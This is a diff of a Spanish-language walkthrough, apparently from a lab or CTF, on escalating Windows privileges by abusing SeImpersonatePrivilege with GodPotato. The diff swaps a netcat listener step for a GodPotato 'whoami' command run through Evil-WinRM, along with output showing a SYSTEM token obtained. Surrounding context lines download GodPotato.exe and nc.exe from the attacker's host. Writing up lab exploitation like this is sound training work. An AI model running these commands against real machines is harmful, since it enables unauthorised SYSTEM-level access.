@@ -20,9 +20,20 @@ Invoke-WebRequest -Uri "http://myipaddress:8000/GodPotato.exe" -OutFile "GodPota
 Invoke-WebRequest -Uri "http://myipaddress:8000/nc.exe" -OutFile "nc.exe"
 ```
 
-Con `GodPotato.exe` y `nc.exe` ya transferidos a la máquina víctima, procedemos a explotar `SeImpersonatePrivilege`.
+Con los binarios disponibles en la máquina víctima, primero comprobamos que GodPotato puede ejecutar comandos bajo el contexto de NT AUTHORITY\SYSTEM.
 
-Primero configuramos `netcat` en la máquina atacante para recibir la conexión:
+Desde Evil-WinRM ejecutamos:
+```
+*Evil-WinRM* PS C:\Windows\TEMP> .\GodPotato.exe -cmd "cmd /c whoami"
+```
 
-```bash
-nc -lvnp 4444
+Durante la ejecución, GodPotato muestra que encuentra un SYSTEM token y consigue utilizarlo:
+```
+[*] CurrentUser: NT AUTHORITY\Servicio de red
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 476 Token:0x808  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+```
+
